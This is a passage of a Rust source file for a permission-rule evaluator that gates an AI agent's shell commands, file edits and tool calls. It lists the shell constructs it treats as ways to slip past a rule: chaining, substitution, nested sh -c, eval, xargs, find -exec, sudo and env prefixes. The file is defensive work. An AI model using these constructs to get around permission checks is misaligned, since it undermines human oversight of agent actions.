//! Security-hardened deterministic permission rules evaluator and `allow_always` rule extractor.
//!
//! Security invariants:
//! - Human-only `plan_approval.is_some()` gates are NEVER matched, auto-allowed, auto-denied,
//!   or converted into persistent rules.
//! - Precedence: `Deny` ALWAYS overrides `Allow` across all scopes and providers; within the same
//!   decision, `Project` scope > `Host` scope, specific provider > any provider.
//! - Shell safety: `CommandPrefix` / `ExactCommand` `Allow` rules reject chaining, piping,
//!   redirection, subshells, command substitution, variable/tilde/glob expansion, and newlines
//!   (`&&`, `||`, `;`, `|`, `` ` ``, `$`, `~`, `*`, `?`, `[`, `]`, `>`, `<`, `\n`, `\r`, `&`) and
//!   compare exact argv tokens preserving argument boundaries. Conversely, `Deny` command rules
//!   inspect every segment including subshells, command substitutions, `sh/bash/zsh -c`, `eval`,
//!   `xargs`, and `find -exec`.
//! - Safe `allow_always` derivation: defaults to `ExactCommand` (exact raw command preserving
//!   quoting/argument boundaries) and ONLY mints `CommandPrefix` for an explicit allowlist of
//!   non-arbitrary-exec commands/subcommand pairs (never bare `python3`, `find`, `git`, `sh`, etc.).
//! - Path & diff safety: resolves live AND dangling symlinks (bounded against cycles, fail-closed
//!   on loops), extracts all paths from multi-file unified diffs, blocks placeholder/truncated
//!   diffs and title-only confirmation dialogs from auto-allow/rule derivation, and escapes glob
//!   metacharacters (`*`, `?`, `[`, `]`, `\`) while preserving native Unix filename characters.

use std::cmp::Ordering;
use std::path::{Path, PathBuf};

use orbit_protocol::{
    PermissionRuleDecision, PermissionRulePatternKind, PermissionRuleRecord,
    PermissionRuleScopeKind, PermissionRuleSource, PermissionRuleToolKind, ProviderKind,
    ToolCallDetail, UpsertPermissionRuleInput,
};
use orbit_store::{canonicalize_project_cwd, resolve_path_preserving_symlinks};

/// Sentinel JSON key emitted by providers when a permission prompt lacks authoritative structured
/// command/path/tool identity and only carries a human display title.
pub const ORBIT_TITLE_ONLY_MARKER_KEY: &str = "__orbit_title_only";

/// Context for evaluating persisted permission rules against an inbound permission request.
#[derive(Debug, Clone)]
pub struct PermissionRuleEvalContext<'a> {
    pub project_cwd: &'a str,
    pub provider: ProviderKind,
    pub title: &'a str,
    pub detail: &'a ToolCallDetail,
    pub has_plan_approval: bool,
}

/// Winning rule match returned by [`evaluate_permission_rules`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PermissionRuleMatch {
    pub rule: PermissionRuleRecord,
    pub reason: String,
}

/// Normalized target path computed relative to the canonical project root.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NormalizedTargetPath {
    pub raw_path: String,
    pub canonical_abs: String,
    /// Relative POSIX-style path strictly inside `project_cwd`, or `None` if outside/unresolvable.
    pub rel_to_project: Option<String>,
    /// True when symlink expansion hit a cycle or unreadable symlink (fail-closed for Allow).
    pub resolution_failed: bool,
}

/// Extracted domain facts from a [`ToolCallDetail`] used by the rule matcher.
#[derive(Debug, Clone)]
struct RequestFacts {
    tool_kind: PermissionRuleToolKind,
    shell_command: Option<String>,
    shell_cwd: Option<String>,
    raw_paths: Vec<String>,
    tool_names: Vec<String>,
    /// When true, the prompt lacks complete/authoritative identity (e.g. placeholder path,
    /// truncated multi-file diff, or display-title-only confirmation) and MUST NEVER auto-allow
    /// or derive persistent Allow rules (Deny rules may still match any visible facts).
    unverifiable_for_allow: bool,
}

/// Validate an incoming [`UpsertPermissionRuleInput`] including shell syntax hardening for
/// `Allow` command rules.
pub fn validate_permission_rule_input(input: &UpsertPermissionRuleInput) -> Result<(), String> {
    input.validate_basic()?;
    if matches!(input.decision, PermissionRuleDecision::Allow)
        && matches!(
            input.pattern_kind,
            PermissionRulePatternKind::CommandPrefix | PermissionRulePatternKind::ExactCommand
        )
    {
        let Some(tokens) = tokenize_simple_shell_command(&input.pattern) else {
            return Err(
                "allow command rules must be a single simple command without shell chaining, redirection, globs, expansions, or subshell metacharacters"
                    .into(),
            );
        };
        if tokens.is_empty() {
            return Err("allow command rule cannot be empty".into());
        }
    }
    Ok(())
}

/// Evaluate persisted permission rules against a single permission request.
///
/// Returns `None` if `ctx.has_plan_approval` is `true` or if no rule matches.
pub fn evaluate_permission_rules(
    rules: &[PermissionRuleRecord],
    ctx: &PermissionRuleEvalContext<'_>,
) -> Option<PermissionRuleMatch> {
    // Hard security invariant: human-only ExitPlanMode / plan approval gates NEVER auto-resolve.
    if ctx.has_plan_approval || rules.is_empty() {
        return None;
    }

    let canon_project = canonicalize_project_cwd(ctx.project_cwd);
    let facts = extract_request_facts(ctx.detail, ctx.title, ctx.provider);
    let normalized_paths: Vec<NormalizedTargetPath> = facts
        .raw_paths
        .iter()
        .map(|p| normalize_target_path(p, &canon_project))
        .collect();

    let mut best: Option<(&PermissionRuleRecord, RuleRank)> = None;

    for rule in rules {
        if !rule_matches(
            rule,
            &canon_project,
            ctx.provider,
            &facts,
            &normalized_paths,
        ) {
            continue;
        }
        let rank = compute_rule_rank(rule);
        let replace = match best {
            None => true,
            Some((_, ref prev_rank)) => rank.cmp(prev_rank) == Ordering::Greater,
        };
        if replace {
            best = Some((rule, rank));
        }
    }

    best.map(|(rule, _)| {
        let scope_label = match rule.scope_kind {
            PermissionRuleScopeKind::Project => "project",
            PermissionRuleScopeKind::Host => "host",
        };
        let decision_label = match rule.decision {
            PermissionRuleDecision::Allow => "allowed",
            PermissionRuleDecision::Deny => "denied",
        };
        let reason = format!(
            "Permission rule ({scope_label} {decision_label}): {} `{}`",
            rule.pattern_kind.as_str(),
            rule.pattern
        );
        PermissionRuleMatch {
            rule: rule.clone(),
            reason,
        }
    })
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct RuleRank {
    decision_rank: u8,
    scope_rank: u8,
    provider_rank: u8,
    specificity_rank: u8,
    pattern_len: usize,
    created_at_ms: i64,
}

impl Ord for RuleRank {
    fn cmp(&self, other: &Self) -> Ordering {
        self.decision_rank
            .cmp(&other.decision_rank)
            .then_with(|| self.scope_rank.cmp(&other.scope_rank))
            .then_with(|| self.provider_rank.cmp(&other.provider_rank))
            .then_with(|| self.specificity_rank.cmp(&other.specificity_rank))
            .then_with(|| self.pattern_len.cmp(&other.pattern_len))
            .then_with(|| self.created_at_ms.cmp(&other.created_at_ms))
    }
}

impl PartialOrd for RuleRank {
    fn partial_cmp(&self, other: &Self) -> Option<Ordering> {
        Some(self.cmp(other))
    }
}

fn compute_rule_rank(rule: &PermissionRuleRecord) -> RuleRank {
    let decision_rank = match rule.decision {
        PermissionRuleDecision::Deny => 2,
        PermissionRuleDecision::Allow => 1,
    };
    let scope_rank = match rule.scope_kind {
        PermissionRuleScopeKind::Project => 2,
        PermissionRuleScopeKind::Host => 1,
    };
    let provider_rank = if rule.provider.is_some() { 2 } else { 1 };
    let specificity_rank = match rule.pattern_kind {
        PermissionRulePatternKind::ExactCommand => 4,
        PermissionRulePatternKind::ToolName => {
            if rule.pattern.contains('*') || rule.pattern.contains('?') {
                1
            } else {
                3
            }
        }
        PermissionRulePatternKind::CommandPrefix | PermissionRulePatternKind::PathGlob => 2,
    };
    RuleRank {
        decision_rank,
        scope_rank,
        provider_rank,
        specificity_rank,
        pattern_len: rule.pattern.len(),
        created_at_ms: rule.created_at.timestamp_millis(),
    }
}

fn rule_matches(
    rule: &PermissionRuleRecord,
    canon_project: &str,
    provider: ProviderKind,
    facts: &RequestFacts,
    normalized_paths: &[NormalizedTargetPath],
) -> bool {
    // Unverifiable prompts (placeholder paths, truncated multi-file diffs, display-title-only
    // confirmations) NEVER match Allow rules; Deny rules still inspect any concrete facts present.
    if matches!(rule.decision, PermissionRuleDecision::Allow) && facts.unverifiable_for_allow {
        return false;
    }

    // 1. Scope filter
    match rule.scope_kind {
        PermissionRuleScopeKind::Host => {}
        PermissionRuleScopeKind::Project => {
            let Some(ref rule_cwd) = rule.project_cwd else {
                return false;
            };
            let canon_rule_cwd = canonicalize_project_cwd(rule_cwd);
            if canon_rule_cwd.is_empty()
                || canon_project.is_empty()
                || canon_rule_cwd != canon_project
            {
                return false;
            }
        }
    }

    // 2. Provider filter (`None` matches every provider)
    if let Some(rule_provider) = rule.provider
        && rule_provider != provider
    {
        return false;
    }

    // 3. Tool kind filter (`Any` matches every tool kind)
    if !matches!(rule.tool_kind, PermissionRuleToolKind::Any) && rule.tool_kind != facts.tool_kind {
        return false;
    }

    // 4. Pattern match
    match rule.pattern_kind {
        PermissionRulePatternKind::CommandPrefix => {
            let Some(ref command) = facts.shell_command else {
                return false;
            };
            match rule.decision {
                PermissionRuleDecision::Allow => {
                    if matches!(rule.scope_kind, PermissionRuleScopeKind::Project)
                        && let Some(ref explicit_cwd) = facts.shell_cwd
                        && !is_within_canonical_root(explicit_cwd, canon_project)
                    {
                        return false;
                    }
                    match_allow_command_prefix(&rule.pattern, command)
                }
                PermissionRuleDecision::Deny => match_deny_command_prefix(&rule.pattern, command),
            }
        }
        PermissionRulePatternKind::ExactCommand => {
            let Some(ref command) = facts.shell_command else {
                return false;
            };
            match rule.decision {
                PermissionRuleDecision::Allow => {
                    if matches!(rule.scope_kind, PermissionRuleScopeKind::Project)
                        && let Some(ref explicit_cwd) = facts.shell_cwd
                        && !is_within_canonical_root(explicit_cwd, canon_project)
                    {
                        return false;
                    }
                    match_allow_exact_command(&rule.pattern, command)
                }
                PermissionRuleDecision::Deny => match_deny_exact_command(&rule.pattern, command),
            }
        }
        PermissionRulePatternKind::PathGlob => {
            if normalized_paths.is_empty() {
                return false;
            }
            match rule.decision {
                PermissionRuleDecision::Allow => {
                    // Fail-closed: EVERY touched path must resolve cleanly (no symlink loop /
                    // unreadable link) and satisfy the Allow glob.
                    normalized_paths.iter().all(|p| {
                        !p.resolution_failed && match_path_glob_for_decision(&rule.pattern, p, true)
                    })
                }
                PermissionRuleDecision::Deny => normalized_paths
                    .iter()
                    .any(|p| match_path_glob_for_decision(&rule.pattern, p, false)),
            }
        }
        PermissionRulePatternKind::ToolName => {
            let pat = rule.pattern.trim();
            if pat.is_empty() {
                return false;
            }
            if matches!(rule.decision, PermissionRuleDecision::Allow)
                && matches!(rule.tool_kind, PermissionRuleToolKind::Any)
                && matches!(pat, "*" | "**")
            {
                return false;
            }
            facts
                .tool_names
                .iter()
                .any(|name| match_tool_name_pattern(pat, name))
        }
    }
}

/// Derive a clean canonical project-scoped `AlwaysAllowGrant` rule when a human resolves a
/// non-plan permission with `"allow_always"`.
///
/// Returns `None` for:
/// - Plan approval gates (`has_plan_approval == true`)
/// - Unverifiable / display-title-only confirmations (e.g. Pi `confirm` dialogs, Antigravity
///   prompts lacking authoritative command/path, placeholder file paths, truncated multi-file diffs)
/// - Multi-file diffs touching multiple distinct paths
/// - Compound/chained/redirected/subshell/glob/variable-expanding shell commands
/// - Privilege escalation wrappers (`sudo`, `su`, `doas`, `eval`, `exec`)
/// - Paths with cyclic/unresolvable symlinks
pub fn derive_rule_from_always_allow(
    project_cwd: &str,
    provider: ProviderKind,
    title: &str,
    detail: &ToolCallDetail,
    has_plan_approval: bool,
) -> Option<UpsertPermissionRuleInput> {
    if has_plan_approval {
        return None;
    }
    let canon_project = canonicalize_project_cwd(project_cwd);
    if canon_project.is_empty() {
        return None;
    }

    let facts = extract_request_facts(detail, title, provider);
    if facts.unverifiable_for_allow {
        return None;
    }
    let note = Some(format!("Granted via Always allow ({})", provider.slug()));

    // 1. Shell commands (direct `ToolCallDetail::Shell` or shell-like `Generic`)
    if let Some(ref raw_cmd) = facts.shell_command {
        // Explicit shell cwd outside the project cannot mint a project-scoped rule.
        if let Some(ref explicit_cwd) = facts.shell_cwd
            && !is_within_canonical_root(explicit_cwd, &canon_project)
        {
            return None;
        }
        let tokens = tokenize_simple_shell_command(raw_cmd)?;
        let (pattern_kind, pattern) = derive_safe_shell_pattern(raw_cmd, &tokens)?;
        return Some(UpsertPermissionRuleInput {
            id: None,
            scope_kind: PermissionRuleScopeKind::Project,
            project_cwd: Some(canon_project),
            provider: None,
            tool_kind: PermissionRuleToolKind::Shell,
            pattern_kind,
            pattern,
            decision: PermissionRuleDecision::Allow,
            source: PermissionRuleSource::AlwaysAllowGrant,
            note,
        });
    }

    // 2. File edits / file writes: require exactly ONE concrete, safely resolvable path
    if matches!(facts.tool_kind, PermissionRuleToolKind::FileWrite) {
        if facts.raw_paths.len() != 1 {
            return None;
        }
        let raw_path = &facts.raw_paths[0];
        if is_placeholder_file_path(raw_path) {
            return None;
        }
        let norm = normalize_target_path(raw_path, &canon_project);
        if norm.resolution_failed {
            return None;
        }
        let target_path = norm.rel_to_project.unwrap_or(norm.canonical_abs);
        if target_path.is_empty() {
            return None;
        }
        return Some(UpsertPermissionRuleInput {
            id: None,
            scope_kind: PermissionRuleScopeKind::Project,
            project_cwd: Some(canon_project),
            provider: None,
            tool_kind: PermissionRuleToolKind::FileWrite,
            pattern_kind: PermissionRulePatternKind::PathGlob,
            pattern: escape_path_glob_literal(&target_path),
            decision: PermissionRuleDecision::Allow,
            source: PermissionRuleSource::AlwaysAllowGrant,
            note,
        });
    }

    // 3. File reads / searches
    if matches!(facts.tool_kind, PermissionRuleToolKind::FileRead) {
        if facts.raw_paths.len() == 1 {
            let raw_path = &facts.raw_paths[0];
            if is_placeholder_file_path(raw_path) {
                return None;
            }
            let norm = normalize_target_path(raw_path, &canon_project);
            if norm.resolution_failed {
                return None;
            }
            let target_path = norm.rel_to_project.unwrap_or(norm.canonical_abs);
            if !target_path.is_empty() {
                return Some(UpsertPermissionRuleInput {
                    id: None,
                    scope_kind: PermissionRuleScopeKind::Project,
                    project_cwd: Some(canon_project),
                    provider: None,
                    tool_kind: PermissionRuleToolKind::FileRead,
                    pattern_kind: PermissionRulePatternKind::PathGlob,
                    pattern: escape_path_glob_literal(&target_path),
                    decision: PermissionRuleDecision::Allow,
                    source: PermissionRuleSource::AlwaysAllowGrant,
                    note,
                });
            }
        } else if facts.raw_paths.len() > 1 {
            return None;
        }
    }

    // 4. Generic / MCP / Network tool-name rule (strictly authoritative identifier — never prose!)
    let primary_tool = facts
        .tool_names
        .first()
        .map(|s| s.trim())
        .filter(|s| is_authoritative_tool_identifier(s))?;

    Some(UpsertPermissionRuleInput {
        id: None,
        scope_kind: PermissionRuleScopeKind::Project,
        project_cwd: Some(canon_project),
        provider: None,
        tool_kind: facts.tool_kind,
        pattern_kind: PermissionRulePatternKind::ToolName,
        pattern: primary_tool.to_string(),
        decision: PermissionRuleDecision::Allow,
        source: PermissionRuleSource::AlwaysAllowGrant,
        note,
    })
}

/// Strictly verify whether a permission request's `allowed_decisions` permits a single-shot
/// `"allow"` decision (`allow`, `allow_once`, or `accept`).
pub fn permits_allow_decision(allowed_decisions: &[String]) -> bool {
    allowed_decisions.iter().any(|d| {
        matches!(
            d.trim().to_ascii_lowercase().as_str(),
            "allow" | "allow_once" | "accept"
        )
    })
}

/// Strictly verify whether `allowed_decisions` permits `"allow_always"`.
pub fn permits_allow_always_decision(allowed_decisions: &[String]) -> bool {
    allowed_decisions
        .iter()
        .any(|d| d.trim().eq_ignore_ascii_case("allow_always"))
}

// ================================================================================================
// Shell parsing, expansion/glob blocking, & nested Deny command extraction
// ================================================================================================

/// Returns `true` if `command` contains any shell chaining, piping, redirection, subshell,
/// command substitution, variable/tilde/glob expansion, comment, newline, unclosed quote,
/// or trailing escape.
pub fn contains_compound_or_unsafe_shell_syntax(command: &str) -> bool {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return true;
    }

    let chars: Vec<char> = trimmed.chars().collect();
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;

    while i < chars.len() {
        let ch = chars[i];
        // Never allow newlines, carriage returns, or NUL bytes anywhere in an Allow command.
        if matches!(ch, '\n' | '\r' | '\0') {
            return true;
        }

        if in_single {
            if ch == '\'' {
                in_single = false;
            }
            i += 1;
            continue;
        }

        if in_double {
            if ch == '\\' {
                if i + 1 >= chars.len() {
                    return true;
                }
                i += 2;
                continue;
            }
            // POSIX shells expand `$VAR`, `${VAR}`, `$(cmd)`, and `` `cmd` `` inside double quotes!
            if matches!(ch, '`' | '$') {
                return true;
            }
            if ch == '"' {
                in_double = false;
            }
            i += 1;
            continue;
        }

        // Unquoted context
        match ch {
            '\\' => {
                if i + 1 >= chars.len() {
                    return true;
                }
                i += 2;
            }
            '\'' => {
                in_single = true;
                i += 1;
            }
            '"' => {
                in_double = true;
                i += 1;
            }
            // Command separators, pipes, backgrounding, redirections, subshells, substitutions,
            // comments, variable/tilde/glob/history expansions
            ';' | '|' | '&' | '>' | '<' | '`' | '(' | ')' | '{' | '}' | '#' | '$' | '~' | '*'
            | '?' | '[' | ']' | '!' => {
                return true;
            }
            _ => {
                i += 1;
            }
        }
    }

    in_single || in_double
}

/// Tokenize a single simple shell command into argv tokens.
/// Returns `None` if any compound/unsafe shell metacharacters, unquoted globs, expansions,
/// tildes, or malformed quotes are present.
pub fn tokenize_simple_shell_command(command: &str) -> Option<Vec<String>> {
    if contains_compound_or_unsafe_shell_syntax(command) {
        return None;
    }

    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_token = false;
    let mut in_single = false;
    let mut in_double = false;
    let chars: Vec<char> = command.trim().chars().collect();
    let mut i = 0;

    while i < chars.len() {
        let ch = chars[i];
        if in_single {
            if ch == '\'' {
                in_single = false;
            } else {
                current.push(ch);
            }
            i += 1;
            continue;
        }
        if in_double {
            if ch == '\\' && i + 1 < chars.len() {
                current.push(chars[i + 1]);
                i += 2;
                continue;
            }
            if ch == '"' {
                in_double = false;
            } else {
                current.push(ch);
            }
            i += 1;
            continue;
        }

        if ch.is_whitespace() {
            if in_token {
                tokens.push(std::mem::take(&mut current));
                in_token = false;
            }
            i += 1;
            continue;
        }

        in_token = true;
        match ch {
            '\\' if i + 1 < chars.len() => {
                current.push(chars[i + 1]);
                i += 2;
            }
            '\'' => {
                in_single = true;
                i += 1;
            }
            '"' => {
                in_double = true;
                i += 1;
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }

    if in_single || in_double {
        return None;
    }
    if in_token {
        tokens.push(current);
    }
    if tokens.is_empty() {
        None
    } else {
        Some(tokens)
    }
}

fn match_allow_command_prefix(rule_pattern: &str, command: &str) -> bool {
    let Some(pattern_tokens) = tokenize_simple_shell_command(rule_pattern) else {
        return false;
    };
    let Some(cmd_tokens) = tokenize_simple_shell_command(command) else {
        return false;
    };
    if cmd_tokens.len() < pattern_tokens.len() {
        return false;
    }
    cmd_tokens
        .iter()
        .zip(pattern_tokens.iter())
        .all(|(c, p)| c == p)
}

fn match_allow_exact_command(rule_pattern: &str, command: &str) -> bool {
    let Some(pattern_tokens) = tokenize_simple_shell_command(rule_pattern) else {
        return false;
    };
    let Some(cmd_tokens) = tokenize_simple_shell_command(command) else {
        return false;
    };
    cmd_tokens == pattern_tokens
}

fn match_deny_command_prefix(rule_pattern: &str, command: &str) -> bool {
    let pattern_tokens = tokenize_loose_shell_segment(rule_pattern);
    if pattern_tokens.is_empty() {
        return false;
    }
    let all_token_lists = collect_deny_command_token_lists(command, 0);
    all_token_lists
        .iter()
        .any(|seg_tokens| segment_tokens_match_deny_prefix(seg_tokens, &pattern_tokens))
}

fn match_deny_exact_command(rule_pattern: &str, command: &str) -> bool {
    let trimmed_pat = rule_pattern.trim();
    if trimmed_pat.is_empty() {
        return false;
    }
    if command.trim() == trimmed_pat {
        return true;
    }
    let pattern_tokens = tokenize_loose_shell_segment(trimmed_pat);
    if pattern_tokens.is_empty() {
        return false;
    }
    let all_token_lists = collect_deny_command_token_lists(command, 0);
    all_token_lists.iter().any(|seg_tokens| {
        seg_tokens == &pattern_tokens || strip_env_and_sudo_prefix(seg_tokens) == pattern_tokens
    })
}

fn segment_tokens_match_deny_prefix(seg_tokens: &[String], pattern_tokens: &[String]) -> bool {
    if seg_tokens.len() >= pattern_tokens.len()
        && seg_tokens[..pattern_tokens.len()] == *pattern_tokens
    {
        return true;
    }
    let stripped = strip_env_and_sudo_prefix(seg_tokens);
    stripped.len() >= pattern_tokens.len() && stripped[..pattern_tokens.len()] == *pattern_tokens
}

fn is_env_assignment_token(tok: &str) -> bool {
    let Some((name, _)) = tok.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name.bytes().enumerate().all(|(idx, b)| {
            if idx == 0 {
                b.is_ascii_alphabetic() || b == b'_'
            } else {
                b.is_ascii_alphanumeric() || b == b'_'
            }
        })
}

fn executable_basename(tok: &str) -> String {
    Path::new(tok)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(tok)
        .to_ascii_lowercase()
}

fn strip_env_and_sudo_prefix(tokens: &[String]) -> &[String] {
    let mut idx = 0;
    while idx < tokens.len() {
        let tok = tokens[idx].as_str();
        if is_env_assignment_token(tok) {
            idx += 1;
            continue;
        }
        let bin = executable_basename(tok);
        if matches!(bin.as_str(), "sudo" | "doas" | "env" | "command" | "nohup") {
            idx += 1;
            while idx < tokens.len() {
                let arg = tokens[idx].as_str();
                if arg == "--" {
                    idx += 1;
                    break;
                }
                if arg.starts_with('-') || is_env_assignment_token(arg) {
                    // Consume flag argument for common option-taking sudo/env flags (`-u user`, `-C dir`, etc.)
                    let takes_val = (bin == "sudo"
                        && matches!(arg, "-u" | "-g" | "-h" | "-p" | "-C" | "-r" | "-t"))
                        || (bin == "env" && matches!(arg, "-u" | "-C" | "-S"));
                    idx += 1;
                    if takes_val && idx < tokens.len() {
                        idx += 1;
                    }
                    continue;
                }
                break;
            }
            continue;
        }
        if bin == "timeout" {
            idx += 1;
            while idx < tokens.len() && tokens[idx].starts_with('-') {
                let takes_val = matches!(
                    tokens[idx].as_str(),
                    "-s" | "-k" | "--signal" | "--kill-after"
                );
                idx += 1;
                if takes_val && idx < tokens.len() {
                    idx += 1;
                }
            }
            // Skip duration positional argument
            if idx < tokens.len() {
                idx += 1;
            }
            continue;
        }
        break;
    }
    &tokens[idx..]
}

/// Collect tokenized command segments from a shell command, recursively inspecting:
/// - Chained / piped / subshell / `$(...)` / `` `...` `` segments
/// - `sh`/`bash`/`zsh`/`dash`/`ksh`/`ash`/`fish` `-c` (and combined flags like `-lc`) strings
/// - `eval <cmd...>` strings
/// - `xargs [flags...] <cmd...>` invocations
/// - `find ... (-exec|-execdir|-ok|-okdir) <cmd...> (;|\+)` clauses
fn collect_deny_command_token_lists(command: &str, depth: usize) -> Vec<Vec<String>> {
    if depth > 8 {
        return Vec::new();
    }
    let mut out = Vec::new();
    let segments = split_shell_segments_for_deny(command, depth);
    for seg in segments {
        let tokens = tokenize_loose_shell_segment(&seg);
        if tokens.is_empty() {
            continue;
        }
        let stripped = strip_env_and_sudo_prefix(&tokens);
        out.push(tokens.clone());

        if let Some(first) = stripped.first() {
            let bin = executable_basename(first);

            // 1. `sh -c "..."`, `bash -lc "..."`, `zsh -ec "..."`, etc.
            if matches!(
                bin.as_str(),
                "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish"
            ) {
                let mut i = 1usize;
                while i < stripped.len() {
                    let arg = stripped[i].as_str();
                    if arg == "--" {
                        break;
                    }
                    if arg == "-c"
                        || (arg.starts_with('-')
                            && !arg.starts_with("--")
                            && arg[1..].contains('c'))
                    {
                        if let Some(nested_cmd) = stripped.get(i + 1) {
                            out.extend(collect_deny_command_token_lists(nested_cmd, depth + 1));
                        }
                        break;
                    }
                    if !arg.starts_with('-') {
                        break;
                    }
                    i += 1;
                }
            }

            // 2. `eval <cmd...>`
            if bin == "eval" && stripped.len() > 1 {
                let nested_cmd = stripped[1..].join(" ");
                out.extend(collect_deny_command_token_lists(&nested_cmd, depth + 1));
            }

            // 3. `xargs [flags...] <cmd> [args...]`
            if bin == "xargs"
                && let Some(nested_tokens) = extract_xargs_command_tokens(&stripped[1..])
            {
                let nested_joined = nested_tokens.join(" ");
                out.push(nested_tokens);
                // Also inspect if xargs itself runs `sh -c` or `eval`
                if !nested_joined.is_empty() {
                    out.extend(collect_deny_command_token_lists(&nested_joined, depth + 1));
                }
            }

            // 4. `find ... -exec/-execdir/-ok/-okdir <cmd...> ;/+`
            if bin == "find" {
                for nested_tokens in extract_find_exec_commands(&stripped[1..]) {
                    let nested_joined = nested_tokens.join(" ");
                    out.push(nested_tokens);
                    if !nested_joined.is_empty() {
                        out.extend(collect_deny_command_token_lists(&nested_joined, depth + 1));
                    }
                }
            }
        }
    }
    out
}

fn extract_xargs_command_tokens(args: &[String]) -> Option<Vec<String>> {
    let mut i = 0usize;
    while i < args.len() {
        let arg = args[i].as_str();
        if arg == "--" {
            i += 1;
            break;
        }
        if !arg.starts_with('-') {
            break;
        }
        // Common GNU/BSD xargs flags that consume a separate option argument
        let takes_value = matches!(
            arg,
            "-I" | "-J"
                | "-L"
                | "-n"
                | "-P"
                | "-s"
                | "-d"
                | "-E"
                | "-e"
                | "-a"
                | "--replace"
                | "--max-args"
                | "--max-lines"
                | "--max-procs"
                | "--max-chars"
                | "--delimiter"
                | "--eof"
                | "--arg-file"
        );
        i += 1;
        if takes_value && i < args.len() {
            i += 1;
        }
    }
    if i < args.len() {
        Some(args[i..].to_vec())
    } else {
        None
    }
}

fn extract_find_exec_commands(args: &[String]) -> Vec<Vec<String>> {
    let mut commands = Vec::new();
    let mut i = 0usize;
    while i < args.len() {
        if matches!(args[i].as_str(), "-exec" | "-execdir" | "-ok" | "-okdir") {
            i += 1;
            let mut cmd_tokens = Vec::new();
            while i < args.len() {
                let tok = args[i].as_str();
                if tok == ";" || tok == "+" || tok == "\\;" {
                    i += 1;
                    break;
                }
                cmd_tokens.push(args[i].clone());
                i += 1;
            }
            if !cmd_tokens.is_empty() {
                commands.push(cmd_tokens);
            }
        } else {
            i += 1;
        }
    }
    commands
}

/// Split a shell command into individual command segments across `&&`, `||`, `;`, `|`, `&`,
/// newlines, parentheses, and recursively extract `$(...)` and `` `...` `` command substitutions
/// so `Deny` rules catch hidden commands anywhere inside compound expressions.
fn split_shell_segments_for_deny(command: &str, depth: usize) -> Vec<String> {
    if depth > 8 {
        return Vec::new();
    }
    let mut segments = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = command.chars().collect();
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;

    let flush = |cur: &mut String, out: &mut Vec<String>| {
        let trimmed = cur.trim();
        if !trimmed.is_empty() {
            out.push(trimmed.to_string());
        }
        cur.clear();
    };

    while i < chars.len() {
        let ch = chars[i];
        if in_single {
            if ch == '\'' {
                in_single = false;
            }
            current.push(ch);
            i += 1;
            continue;
        }

        if ch == '\\' && i + 1 < chars.len() {
            current.push(ch);
            current.push(chars[i + 1]);
            i += 2;
            continue;
        }

        // Extract `$( ... )` command substitution even inside double quotes
        if ch == '$' && i + 1 < chars.len() && chars[i + 1] == '(' {
            let start = i + 2;
            let mut paren_depth = 1usize;
            let mut j = start;
            let mut inner_single = false;
            let mut inner_double = false;
            while j < chars.len() && paren_depth > 0 {
                let c = chars[j];
                if inner_single {
                    if c == '\'' {
                        inner_single = false;
                    }
                } else if inner_double {
                    if c == '\\' && j + 1 < chars.len() {
                        j += 1;
                    } else if c == '"' {
                        inner_double = false;
                    }
                } else {
                    match c {
                        '\'' => inner_single = true,
                        '"' => inner_double = true,
                        '(' => paren_depth += 1,
                        ')' => paren_depth -= 1,
                        _ => {}
                    }
                }
                j += 1;
            }
            let end = if paren_depth == 0 {
                j.saturating_sub(1)
            } else {
                j
            };
            let inner: String = chars[start..end].iter().collect();
            segments.extend(split_shell_segments_for_deny(&inner, depth + 1));
            current.push(' ');
            i = j;
            continue;
        }

        // Extract `` `...` `` backtick command substitution even inside double quotes
        if ch == '`' {
            let start = i + 1;
            let mut j = start;
            while j < chars.len() {
                if chars[j] == '\\' && j + 1 < chars.len() {
                    j += 2;
                    continue;
                }
                if chars[j] == '`' {
                    break;
                }
                j += 1;
            }
            let inner: String = chars[start..j].iter().collect();
            segments.extend(split_shell_segments_for_deny(&inner, depth + 1));
            current.push(' ');
            i = if j < chars.len() { j + 1 } else { j };
            continue;
        }

        if in_double {
            if ch == '"' {
                in_double = false;
            }
            current.push(ch);
            i += 1;
            continue;
        }

        match ch {
            '\'' => {
                in_single = true;
                current.push(ch);
                i += 1;
            }
            '"' => {
                in_double = true;
                current.push(ch);
                i += 1;
            }
            ';' | '\n' | '\r' | '(' | ')' | '{' | '}' => {
                flush(&mut current, &mut segments);
                i += 1;
            }
            '&' | '|' => {
                flush(&mut current, &mut segments);
                if i + 1 < chars.len() && chars[i + 1] == ch {
                    i += 2;
                } else {
                    i += 1;
                }
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }

    flush(&mut current, &mut segments);
    segments
}

fn tokenize_loose_shell_segment(segment: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_token = false;
    let mut in_single = false;
    let mut in_double = false;
    let chars: Vec<char> = segment.trim().chars().collect();
    let mut i = 0;

    while i < chars.len() {
        let ch = chars[i];
        if in_single {
            if ch == '\'' {
                in_single = false;
            } else {
                current.push(ch);
            }
            i += 1;
            continue;
        }
        if in_double {
            if ch == '\\' && i + 1 < chars.len() {
                current.push(chars[i + 1]);
                i += 2;
                continue;
            }
            if ch == '"' {
                in_double = false;
            } else {
                current.push(ch);
            }
            i += 1;
            continue;
        }
        if ch.is_whitespace() {
            if in_token {
                tokens.push(std::mem::take(&mut current));
                in_token = false;
            }
            i += 1;
            continue;
        }
        if matches!(ch, '>' | '<') {
            if in_token {
                tokens.push(std::mem::take(&mut current));
                in_token = false;
            }
            i += 1;
            continue;
        }
        in_token = true;
        match ch {
            '\\' if i + 1 < chars.len() => {
                current.push(chars[i + 1]);
                i += 2;
            }
            '\'' => {
                in_single = true;
                i += 1;
            }
            '"' => {
                in_double = true;
                i += 1;
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }
    if in_token {
        tokens.push(current);
    }
